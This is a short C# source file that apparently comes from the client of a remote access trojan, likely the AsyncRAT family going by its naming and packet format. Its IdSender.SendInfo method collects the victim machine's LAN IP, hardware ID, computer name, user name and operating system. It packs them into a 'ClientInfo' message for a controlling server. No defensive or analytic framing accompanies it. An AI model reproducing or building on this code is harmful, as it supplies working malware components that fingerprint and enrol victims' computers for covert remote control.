using MessagePackLib.MessagePack;
using Microsoft.VisualBasic.Devices;
using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
//using System.Windows.Forms;

namespace Client.Helper
{
    public static class IdSender
    {
        public static byte[] SendInfo()
        {
            string ipadress = Dns.GetHostEntry(Dns.GetHostName()).AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork).ToString();
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
            msgpack.ForcePathObject("HWID").AsString = Settings.Hwid;
            msgpack.ForcePathObject("Lan").AsString = ipadress;
            msgpack.ForcePathObject("Computer").AsString = Environment.MachineName.ToString();
            msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft", null) + " " +
                Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
            return msgpack.Encode2Bytes();
        }

    }
}
